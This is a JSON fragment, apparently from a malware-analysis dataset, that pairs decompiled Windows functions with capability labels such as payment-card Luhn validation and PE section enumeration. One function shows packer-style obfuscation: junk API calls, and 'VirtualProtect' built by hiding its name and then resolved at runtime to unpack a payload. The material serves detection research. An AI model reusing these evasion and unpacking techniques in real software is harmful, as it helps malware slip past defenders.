        "decompiled_code": "\nvoid fcn.0041ff00(void)\n\n{\n    int32_t unaff_ESI;\n    uchar *puStack468;\n    uint uStack464;\n    uint uStack460;\n    uint uStack456;\n    uint uStack452;\n    uint uStack448;\n    uint uStack444;\n    uint uStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uint uStack424;\n    uchar auStack328 [328];\n    \n    if (*0x5fca0b8 == 0xa76) {\n        uStack424 = 0;\n        uStack428 = 0;\n        uStack432 = 0;\n        uStack436 = 0x41ff22;\n        (*_sym.imp.KERNEL32.dll_LoadLibraryExA)();\n        uStack436 = 0;\n        uStack440 = 0;\n        uStack444 = 0;\n        uStack448 = 0;\n        uStack452 = 0;\n        uStack456 = 0;\n        uStack460 = 0;\n        uStack464 = 0;\n        puStack468 = 0x41ff38;\n        (*_sym.imp.KERNEL32.dll_CreateNamedPipeA)();\n        puStack468 = &stack0xfffffeb8;\n        (*_sym.imp.KERNEL32.dll_GetVersionExW)();\n        (*_sym.imp.KERNEL32.dll_OpenFile)(0, &stack0xfffffe2c, 0);\n        (*_sym.imp.KERNEL32.dll_DeactivateActCtx)(0, 0);\n        (*_sym.imp.KERNEL32.dll_WriteFile)(0, 0, 0, 0, 0);\n        sub.KERNEL32.dll_SetConsoleDisplayMode(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_WritePrivateProfileStructA)(0, 0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_IsDBCSLeadByteEx)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetFileApisToANSI)();\n        (*_sym.imp.KERNEL32.dll_TlsGetValue)(0);\n        (*_sym.imp.KERNEL32.dll_GetThreadPriority)(0);\n    }\n    *(*0x5d65470 + unaff_ESI) = *(*0x5fca0bc + 0xa2401 + unaff_ESI);\n    return;\n}\n",
        "token_count": 513
    },
    "00420280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00420280(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint arg_10h;\n    int32_t iStack1220;\n    int32_t iStack1188;\n    uchar auStack1036 [1032];\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetPrivateProfileStructA;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetCommandLineA;\n    pcVar2 = _sym.imp.KERNEL32.dll_SetLocalTime;\n    iStack1220 = 0;\n    do {\n        if (*0x5fca0b8 == 0xfc) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleCursorInfo)();\n            (*_sym.imp.KERNEL32.dll_DisconnectNamedPipe)(0);\n            (*pcVar2)(0);\n        }\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (*0x5fca0b8 == 0x1264) {\n            (*pcVar2)();\n            (*pcVar4)();\n            (*pcVar1)(0, 0, auStack1036, 0);\n            (*_sym.imp.KERNEL32.dll_ScrollConsoleScreenBufferA)(0, 0, 0, 0, 0);\n        }\n    } while (((iStack1220 < 0x18f9a7) || (iStack1188 == 0x8a392)) &&\n            (iStack1220 = iStack1220 + 1,  iStack1220 < 0x3532b7b1));\n    arg_10h = 0x5e16148;\n    iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n    if (iVar7 == 0x65f7) {\n        fcn.00403d50(0, \" %s %d %f\", arg_10h);\n        fcn.0040435c(0, 0);\n        fcn.00404379(0x42e5d0, 0);\n        fcn.00404040();\n        fcn.00401e60();\n        fcn.00401ad0();\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_SetCalendarInfoA;\n    pcVar2 = _sym.imp.KERNEL32.dll_PostQueuedCompletionStatus;\n    iVar7 = 0;\n    do {\n        if (*0x5fca0b8 == 0x123f) {\n            (*pcVar4)(0, 0, 0);\n        }\n        if (iVar7 == 0x291c7) {\n            *0x5fca0b8 = *0x42d49c;\n        }\n        if (*0x5fca0b8 == 0x625) {\n            (*pcVar2)(0, 0, 0);\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x499677);\n    *0x5fca0b8 = *0x5fca0b8 + 0xa2401;\n    *0x42e5d0 = 0;\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)(0x42e5d0);\n    *0x5e16144 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x42e5d0);\n    pcVar4 = _sym.imp.KERNEL32.dll_LocalAlloc;\n    pcVar2 = _sym.imp.KERNEL32.dll_WriteConsoleW;\n    iVar7 = 0;\n    do {\n        if (*0x5fca0b8 == 0x262) {\n            (*pcVar2)(0, 0, 0, &stack0xfffffb2c, 0);\n        }\n        if (iVar7 == 0x5aa0c) {\n            *0x5d65470 = (*pcVar4)(0, *0x5fca0b8);\n        }\n        pcVar5 = _sym.imp.KERNEL32.dll_SetFileApisToANSI;\n        pcVar3 = _sym.imp.KERNEL32.dll_OpenSemaphoreA;\n        pcVar1 = _sym.imp.KERNEL32.dll_EnumResourceNamesW;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x673996);\n    iVar7 = 0;\n    do {\n        if (*0x5fca0b8 == 0x1266) {\n            (*pcVar1)(0, 0, 0, 0);\n            (*pcVar5)();\n        }\n        if (iVar7 == 0x171922) {\n            *0x5fca0bc = *0x42d3c8;\n        }\n        if (*0x5fca0b8 == 0x9b2) {\n            (*pcVar3)(0, 0, 0);\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_GetSystemDefaultLangID;\n        pcVar4 = _sym.imp.KERNEL32.dll_WriteProfileSectionW;\n        pcVar2 = _sym.imp.KERNEL32.dll_SetVolumeLabelW;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x807b1d);\n    uVar8 = 0;\n    if (*0x5fca0b8 != 0) {\n        do {\n            if (*0x5fca0b8 == 0xc29) {\n                (*pcVar4)(0, 0);\n                (*pcVar6)();\n                (*pcVar2)(0, 0);\n            }\n            fcn.0041ff00();\n            if (*0x5fca0b8 == 0x75d) {\n                (*_sym.imp.KERNEL32.dll_SetCommTimeouts)(0, 0);\n                (*_sym.imp.KERNEL32.dll_FindResourceExA)(0, 0, 0, 0);\n            }\n            uVar8 = uVar8 + 1;\n        } while (uVar8 < *0x5fca0b8);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_AddAtomW;\n    pcVar4 = _sym.imp.KERNEL32.dll_OpenMutexA;\n    pcVar2 = _sym.imp.KERNEL32.dll_FillConsoleOutputCharacterA;\n    iVar7 = 0;\n    do {\n        if (*0x5fca0b8 == 0x94d) {\n            (*pcVar1)(0);\n            (*pcVar4)(0, 0, 0);\n            (*pcVar2)(0, 0, 0, 0, &stack0xfffffb20);\n        }\n        if (iVar7 == 0x75ec5) {\n            *0x5e16144 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"kernel32.dll\");\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x17584b);\n    *0x42e5d0 = 0;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(0x42e5d0, \"WirtualProtect\");\n    *0x42e5d0 = 0x56;\n    *0x5d6546c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x5e16144, 0x42e5d0);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetTimeZoneInformation;\n    iVar7 = 0;\n    do {\n        if (iVar7 == 0xd26c) {\n            fcn.0041feb0();\n        }\n        if (*0x5fca0b8 == 0x3fe) {\n            (*pcVar2)(0);\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x3dc4a3);\n    fcn.00420200();\n    pcVar1 = _sym.imp.KERNEL32.dll_SetCurrentDirectoryW;\n    pcVar4 = _sym.imp.KERNEL32.dll_GlobalUnlock;\n    pcVar2 = _sym.imp.KERNEL32.dll_SetConsoleMode;\n    iVar7 = 0;\n    do {\n        if (*0x5fca0b8 == 0x768) {\n            (*pcVar2)(0, 0);\n            (*pcVar1)(0);\n            (*pcVar4)(0);\n        }\n        if (iVar7 == 0x4f3b6) {\n            fcn.0041fee0();\n        }\n        pcVar3 = _sym.imp.KERNEL32.dll_GetBinaryTypeW;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x270c5f);\n    iVar7 = 0xdd9a7;\n    do {\n        if (*0x5fca0b8 == 0xfe9) {\n            (*pcVar3)(0, &stack0xfffffb20);\n        }\n        iVar7 = iVar7 + -1;\n    } while (iVar7 != 0);\n    fcn.0041fef0();\n    return;\n}\n",
        "token_count": 2015
    },
    "00421a47": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00421a47(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    float10 in_ST0;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    fcn.004221fb();\n    return in_ST0;\n}\n",
        "token_count": 88
    },
    "00404b8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404b8d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040dc1f(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 113
    },
    "00402fe0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00402fe0(void)\n\n{\n    int32_t unaff_ESI;\n    \n    *(unaff_ESI + 0x10) = unaff_ESI + 8;\n    *(unaff_ESI + 0x14) = unaff_ESI + 0xc;\n    *(unaff_ESI + 0x20) = unaff_ESI + 0x18;\n    *(unaff_ESI + 0x24) = unaff_ESI + 0x1c;\n    *(unaff_ESI + 0x30) = unaff_ESI + 0x28;\n    *(unaff_ESI + 0x34) = unaff_ESI + 0x2c;\n    fcn.00402a30();\n    fcn.004029c0();\n    return;\n}\n",
        "token_count": 181
    },
    "00414c91": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00414c91(void)\n\n{\n    *0x42d154 = (*_sym.imp.KERNEL32.dll_CreateFileA)(\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 61
    },
    "00401070": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00401070(char *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    \n    pcVar1 = param_1 + 1;\n    do {\n        cVar2 = *param_1;\n        param_1 = param_1 + 1;\n    } while (cVar2 != '\\0');\n    return param_1 - pcVar1;\n}\n",
        "token_count": 90
    },
    "0040bfea": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040bfea(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004073fc(0x429e10, 0xc);\n    fcn.00409f18(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x42dcc0;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x42dcbc;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040c02e;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00404248(arg_8h_00);\ncode_r0x0040c02e:\n        fcn.00404248(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040c051();\n    fcn.00407441();\n    return;\n}\n",
        "token_count": 395
    }
}